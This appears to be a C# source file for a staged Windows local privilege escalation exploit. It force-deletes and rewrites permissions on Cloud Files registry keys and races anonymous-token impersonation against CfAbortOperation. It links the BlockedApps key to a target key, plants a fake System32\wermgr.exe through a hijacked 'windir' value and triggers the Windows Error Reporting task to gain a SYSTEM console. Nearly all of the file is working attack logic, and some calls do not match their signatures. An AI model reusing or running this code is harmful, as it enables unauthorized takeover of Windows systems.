    /// <summary>
    /// Registry operations service class
    /// </summary>
    public static class RegistryService
    {
        /// <summary>
        /// Opens a registry key with specified access rights
        /// </summary>
        /// <param name="root">Root key (can be null for absolute paths)</param>
        /// <param name="path">Path to the key</param>
        /// <param name="desiredAccess">Access rights required</param>
        /// <returns>Opened NtKey or null if failed</returns>
        public static NtKey OpenKey(NtKey root, string path, KeyAccessRights desiredAccess)
        {
            Logger.LogInfo($"Opening key '{path}' for {desiredAccess}");
            
            try
            {
                using (var obja = new ObjectAttributes(path, AttributeFlags.OpenLink, root))
                {
                    using (var key = NtKey.Open(obja, desiredAccess, KeyCreateOptions.NonVolatile, false))
                    {
                        if (key.IsSuccess)
                            return key.Result.Duplicate();
                    }
                    
                    using (var imp = NtThread.Current.ImpersonateAnonymousToken())
                    {
                        var result = NtKey.Open(obja, desiredAccess, KeyCreateOptions.NonVolatile);
                        if (result.IsSuccess)
                            return result.Result;
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.LogError($"Failed to open key '{path}': {ex.Message}");
                return null;
            }
            
            return null;
        }

        /// <summary>
        /// Sets security descriptor on a registry key
        /// </summary>
        /// <param name="key">Key to modify</param>
        /// <param name="info">Security information to set</param>
        public static void SetSecurityDescriptor(NtKey key, SecurityInformation info)
        {
            try
            {
                var sd = new SecurityDescriptor(Config.SECURITY_DESCRIPTOR);
                key.SetSecurityDescriptor(sd, info);
                Logger.LogInfo($"Set security descriptor on {key.FullPath}");
            }
            catch (Exception ex)
            {
                Logger.LogError($"Failed to set security descriptor on {key.FullPath}: {ex.Message}");
            }
        }

        /// <summary>
        /// Deletes a registry key and all its subkeys recursively
        /// </summary>
        /// <param name="root">Root key to delete</param>
        public static void DeleteRegistryTree(NtKey root)
        {
            try
            {
                foreach (var name in root.QueryKeys())
                {
                    ForceKeyDeleteKey(root, name);
                }
            }
            catch (Exception ex)
            {
                Logger.LogError($"Failed to delete registry tree under {root.FullPath}: {ex.Message}");
            }
        }

        /// <summary>
        /// Forces deletion of a registry key by modifying permissions first
        /// </summary>
        /// <param name="root">Root key containing the target</param>
        /// <param name="name">Name of the key to delete</param>
        public static void ForceKeyDeleteKey(NtKey root, string name)
        {
            Logger.LogInfo($"Deleting {root.FullPath}\\{name}");
            
            try
            {
                // First, get WriteDac access to modify DACL
                using (var key = OpenKey(root, name, KeyAccessRights.WriteDac))
                {
                    if (key != null)
                    {
                        Logger.LogInfo($"Opened {name} for WriteDac");
                        SetSecurityDescriptor(key, SecurityInformation.Dacl);
                    }
                }

                // Then, get WriteOwner access to modify owner
                using (var key = OpenKey(root, name, KeyAccessRights.WriteOwner))
                {
                    if (key != null)
                    {
                        Logger.LogInfo($"Opened {name} for WriteOwner");
                        SetSecurityDescriptor(key, SecurityInformation.Label);
                    }
                }

                // Finally, get Delete access and delete the key
                using (var newKey = OpenKey(root, name, KeyAccessRights.Delete | KeyAccessRights.EnumerateSubKeys))
                {
                    if (newKey != null)
                    {
                        Logger.LogInfo($"Opened {name} for enumerate and delete");
                        DeleteRegistryTree(newKey);
                        newKey.Delete();
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.LogError($"Failed to force delete key {root.FullPath}\\{name}: {ex.Message}");
            }
        }

        /// <summary>
        /// Creates a symbolic link between registry keys
        /// </summary>
        /// <param name="source">Source key path</param>
        /// <param name="target">Target key path</param>
        public static void CreateSymbolicLink(string source, string target)
        {
            try
            {
                NtKey.CreateSymbolicLink(source, null, target);
                Logger.LogInfo($"Created symbolic link from {source} to {target}");
            }
            catch (Exception ex)
            {
                Logger.LogError($"Failed to create symbolic link from {source} to {target}: {ex.Message}");
            }
        }

        /// <summary>
        /// Sets a value in a registry key
        /// </summary>
        /// <param name="keyPath">Path to the key</param>
        /// <param name="valueName">Name of the value</param>
        /// <param name="value">Value to set</param>
        public static void SetValue(string keyPath, string valueName, object value)
        {
            try
            {
                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.SetValue))
                {
                    if (key != null)
                    {
                        key.SetValue(valueName, value);
                        Logger.LogInfo($"Set value '{valueName}' to '{value}' in {keyPath}");
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.LogError($"Failed to set value '{valueName}' in {keyPath}: {ex.Message}");
            }
        }

        /// <summary>
        /// Deletes a registry key
        /// </summary>
        /// <param name="keyPath">Path to the key</param>
        /// <param name="recursive">Whether to delete recursively</param>
        public static void DeleteKey(string keyPath, bool recursive = false)
        {
            try
            {
                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.Delete))
                {
                    if (key != null)
                    {
                        if (recursive)
                        {
                            DeleteRegistryTree(key);
                        }
                        key.Delete();
                        Logger.LogInfo($"Deleted key {keyPath}");
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.LogError($"Failed to delete key {keyPath}: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// State machine for managing the exploit stages
    /// </summary>
    public class ExploitStateMachine
    {
        private enum State
        {
            Initial,
            Stage0,
            Stage1,
            Stage2,
            Stage3,
            Completed,
            Failed
        }

        private State _currentState = State.Initial;
        private readonly int _targetStage;
        private readonly string[] _args;

        public ExploitStateMachine(int targetStage, string[] args)
        {
            _targetStage = targetStage;
            _args = args;
        }

        /// <summary>
        /// Run the state machine
        /// </summary>
        public void Run()
        {
            Logger.LogInfo($"Starting exploit with target stage: {_targetStage}");
            
            while (_currentState != State.Completed && _currentState != State.Failed)
            {
                switch (_currentState)
                {
                    case State.Initial:
                        Logger.LogInfo("Initializing exploit...");
                        _currentState = State.Stage0;
                        break;
                    
                    case State.Stage0:
                        if (_targetStage <= 0)
                        {
                            ExecuteStage0();
                            _currentState = State.Completed;
                        }
                        else
                        {
                            ExecuteStage0();
                            _currentState = State.Stage1;
                        }
                        break;
                    
                    case State.Stage1:
                        if (_targetStage <= 1)
                        {
                            ExecuteStage1();
                            _currentState = State.Completed;
                        }
                        else
                        {
                            ExecuteStage1();
                            _currentState = State.Stage2;
                        }
                        break;
                    
                    case State.Stage2:
                        if (_targetStage <= 2)
                        {
                            ExecuteStage2();
                            _currentState = State.Completed;
                        }
                        else
                        {
                            ExecuteStage2();
                            _currentState = State.Stage3;
                        }
                        break;
                    
                    case State.Stage3:
                        if (_targetStage <= 3)
                        {
                            ExecuteStage3();
                            _currentState = State.Completed;
                        }
                        else
                        {
                            ExecuteStage3();
                            _currentState = State.Completed;
                        }
                        break;
                    
                    default:
                        Logger.LogError($"Unknown state: {_currentState}");
                        _currentState = State.Failed;
                        break;
                }
            }
            
            if (_currentState == State.Completed)
            {
                Logger.LogInfo("Exploit completed successfully");
            }
            else if (_currentState == State.Failed)
            {
                Logger.LogError("Exploit failed");
            }
        }

        private void ExecuteStage0()
        {
            Logger.LogInfo("Executing Stage 0");
            
            try
            {
                for (int i = 1; i < Config.MAX_STAGE; ++i)
                {
                    Win32ProcessConfig config = new Win32ProcessConfig
                    {
                        CommandLine = "run",
                        ApplicationName = typeof(Program).Assembly.Location,
                        TerminateOnDispose = true
                    };

                    using (var p = Win32Process.CreateProcess(config))
                    {
                        if (p.Process.Wait(Config.STAGE_WAIT_TIMEOUT) != NtStatus.STATUS_SUCCESS)
                        {
                            throw new ArgumentException($"Failed to run stage {i}");
                        }
                    }
                }
                Logger.LogInfo("Stage 0 completed");
            }
            catch (Exception ex)
            {
                Logger.LogError("Stage 0 failed", ex);
                _currentState = State.Failed;
            }
        }

        private void ExecuteStage1(bool rootKey)
        {
            Logger.LogInfo($"Executing Stage 1 with rootKey: {rootKey}");
            
            try
            {
                Thread checkKeyThread = new Thread(CheckKeyThread);
                checkKeyThread.IsBackground = true;
                checkKeyThread.Start(rootKey);
                Thread.Sleep(1000);

                var currentThread = NtThread.OpenCurrent();
                var anonThread = new Thread(ForceTokenThread)
                {
                    IsBackground = true
                };
                anonThread.Start(currentThread);

                while (true)
                {
                    int result = CfAbortOperation(NtProcess.Current.ProcessId,
                        IntPtr.Zero, AbortHydrationFlags.Block);
                    if (result < 0)
                    {
                        Logger.LogError($"CfAbortOperation failed with error: {result}");
                        break;
                    }
                }
                Logger.LogInfo("Stage 1 completed");
            }
            catch (Exception ex)
            {
                Logger.LogError("Stage 1 failed", ex);
                _currentState = State.Failed;
            }
        }

        private void ExecuteStage2()
        {
            Logger.LogInfo("Executing Stage 2");
            
            try
            {
                using (var key = RegistryService.OpenKey(null, Config.CLOUD_FILES, 
                    KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner | KeyAccessRights.EnumerateSubKeys))
                {
                    if (key != null)
                    {
                        RegistryService.SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                        RegistryService.DeleteRegistryTree(key);
                    }
                }

                RegistryService.CreateSymbolicLink(Config.BLOCKED_APPS, Config.TARGET_KEY);
                ExecuteStage1(false);
                Logger.LogInfo("Stage 2 completed");
            }
            catch (Exception ex)
            {
                Logger.LogError("Stage 2 failed", ex);
                _currentState = State.Failed;
            }
        }

        private void ExecuteStage3()
        {
            Logger.LogInfo("Executing Stage 3");
            
            try
            {
                // Clean up link
                using (var key = RegistryService.OpenKey(null, Config.BLOCKED_APPS, KeyAccessRights.Delete))
                {
                    if (key != null)
                    {
                        Logger.LogInfo($"Cleaning up link {key.FullPath}");
                        key.Delete();
                    }
                }

                // Set security on target key
                using (var key = RegistryService.OpenKey(null, Config.TARGET_KEY, 
                    KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner))
                {
                    if (key != null)
                    {
                        RegistryService.SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                    }
                }

                // Clean up subkeys
                var key2 = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment", RegistryRights.FullControl);
                if (key2 != null)
                {
                    foreach (var subkey in key2.GetSubKeyNames())
                    {
                        var fullSubkey = Config.TARGET_KEY + @"\" + subkey;
                        Logger.LogInfo($"Cleaning up subkey {fullSubkey}");
                        
                        NtKey _subkey = null;
                        try
                        {
                            _subkey = NtKey.Open(fullSubkey, null, KeyAccessRights.WriteDac);
                        }
                        catch (Exception ex)
                        {
                            Logger.LogWarning($"Failed to open {fullSubkey} with default access, trying with NtApi: {ex.Message}");
                            _subkey = RegistryService.OpenKey(null, fullSubkey, KeyAccessRights.WriteDac);
                        }
                        
                        if (_subkey != null)
                        {
                            RegistryService.SetSecurityDescriptor(_subkey, SecurityInformation.Dacl);
                            _subkey.Close();
                            
                            _subkey = NtKey.Open(fullSubkey, null, KeyAccessRights.Delete);
                            if (_subkey != null)
                            {
                                _subkey.Delete();
                                _subkey.Close();
                            }
                        }
                    }
                    key2.Close();
                }

                // Set windir environment variable
                RegistryService.SetValue(Config.TARGET_KEY, "windir", 
                    Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName));

                // Create fake System32 directory and wermgr.exe
                string fakeSystem32 = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\System32";
                Directory.CreateDirectory(fakeSystem32);
                string fakeWer = fakeSystem32 + @"\wermgr.exe";
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakeWer, true);

                // Set up named pipe server
                var srvNamedPipe = new NamedPipeServerStream(Config.PIPE_NAME);
                var pipeWaitTask = srvNamedPipe.WaitForConnectionAsync();

                // Run Windows Error Reporting task
                using (TaskService taskSvc = new TaskService())
                {
                    Task werTask = taskSvc.GetTask(Config.WER_TASK_PATH);
                    werTask.Run();
                    werTask.Dispose();
                }

                // Wait for pipe connection
                if (!pipeWaitTask.Wait(Config.PIPE_CONNECTION_TIMEOUT))
                {
                    Logger.LogError("Exploit failed: Pipe connection timeout");
                    _currentState = State.Failed;
                }
                else
                {
                    Logger.LogInfo("Exploit succeeded");
                    _currentState = State.Completed;
                }

                // Clean up
                srvNamedPipe.Dispose();
                Thread.Sleep(1000);
                
                try
                {
                    File.Delete(fakeWer);
                    Directory.Delete(fakeSystem32);
                }
                catch (Exception ex)
                {
                    Logger.LogWarning($"Failed to clean up fake files: {ex.Message}");
                }

                // Delete target key
                RegistryService.DeleteKey(Config.TARGET_KEY, false);
                
                Logger.LogInfo("Stage 3 completed");
            }
            catch (Exception ex)
            {
                Logger.LogError("Stage 3 failed", ex);
                _currentState = State.Failed;
            }
        }

        private void CheckKeyThread(object rootKeyObj)
        {
            bool rootKey = (bool)rootKeyObj;
            string path = rootKey ? Config.ROOT_KEY : @"\Registry\User\.DEFAULT";
            
            try
            {
                using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
                {
                    while (true)
                    {
                        if (key.NotifyChange(NotifyCompletionFilter.Name, true) == NtStatus.STATUS_NOTIFY_ENUM_DIR)
                        {
                            Logger.LogInfo("Change detected in registry");
                            Environment.Exit(0);
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.LogError($"Error in CheckKeyThread: {ex.Message}");
            }
        }

        private void ForceTokenThread(object obj)
        {
            try
            {
                using (var thread = (NtThread)obj)
                {
                    Logger.LogInfo($"In force token thread {thread}");
                    using (var token = TokenUtils.GetAnonymousToken())
                    {
                        while (true)
                        {
                            thread.SetImpersonationToken(token);
                            thread.SetImpersonationToken(null);
                        }
                    }
                }
            }
            catch (ThreadAbortException)
            {
                return;
            }
            catch (Exception ex)
            {
                Logger.LogError($"Error in ForceTokenThread: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// P/Invoke declarations
    /// </summary>
    public static class NativeMethods
    {
        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
        public static extern int CfAbortOperation(int pid, IntPtr unknown, AbortHydrationFlags flags);

        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
        public static extern int CfGetPlatformInfo(
            out CF_PLATFORM_INFO PlatformVersion
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out UInt32 ClientProcessId);
    }

    /// <summary>
    /// Enum for abort hydration flags
    /// </summary>
    [Flags]
    public enum AbortHydrationFlags
    {
        None = 0,
        Unblock = 1,
        Block = 2,
    }

    /// <summary>
    /// Platform info structure
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct CF_PLATFORM_INFO
    {
        public int BuildNumber;
        public int RevisionNumber;
        public int IntegrationNumber;
    }

    /// <summary>
    /// Main program class
    /// </summary>
    public static class Program
    {
        /// <summary>
        /// Main entry point
        /// </summary>
        /// <param name="args">Command line arguments</param>
        public static void Main(string[] args)
        {
            try
            {
                // Check if running as system
                bool isSystem = false;
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    isSystem = identity.IsSystem;
                }

                if (isSystem)
                {
                    Logger.LogInfo("Running as SYSTEM");
                    Environment.SetEnvironmentVariable("windir", @"C:\Windows", EnvironmentVariableTarget.Process);
                    
                    var namedPipeClient = new NamedPipeClientStream(Config.PIPE_NAME);
                    namedPipeClient.Connect();
                    
                    UInt32 nSesID;
                    IntPtr hPipe = namedPipeClient.SafePipeHandle.DangerousGetHandle();
                    
                    if (!NativeMethods.GetNamedPipeServerSessionId(hPipe, out nSesID))
                    {
                        Logger.LogError("Failed to get named pipe server session ID");
                        return;
                    }
                    
                    namedPipeClient.Dispose();
                    
                    // Get and modify token
                    NtToken token = NtToken.OpenEffectiveToken();
                    NtToken token2 = token.DuplicateToken();
                    token.Dispose();
                    token = token2;
                    token.SetSessionId(((int)nSesID));
                    
                    // Create process as user
                    Win32Process.CreateProcessAsUser(token, @"C:\Windows\System32\conhost.exe", "", CreateProcessFlags.None, null);
                    return;
                }

                // Check platform info
                int platformResult = NativeMethods.CfGetPlatformInfo(out CF_PLATFORM_INFO _);
                if (platformResult < 0)
                {
                    Logger.LogError($"Failed to get platform info: {platformResult}");
                    return;
                }

                // Parse arguments and run state machine
                int stage = 0;
                if (args.Length > 0)
                {
                    if (!int.TryParse(args[0], out stage))
                    {
                        Logger.LogError($"Invalid stage argument: {args[0]}");
                        return;
                    }
                    
                    if (stage < 0 || stage >= Config.MAX_STAGE)
                    {
                        Logger.LogError($"Stage must be between 0 and {Config.MAX_STAGE - 1}");
                        return;
                    }
                }

                // Create and run state machine
                var stateMachine = new ExploitStateMachine(stage, args);
                stateMachine.Run();
            }
            catch (Exception ex)
            {
                Logger.LogError("Unhandled exception in Main", ex);
            }
        }
    }
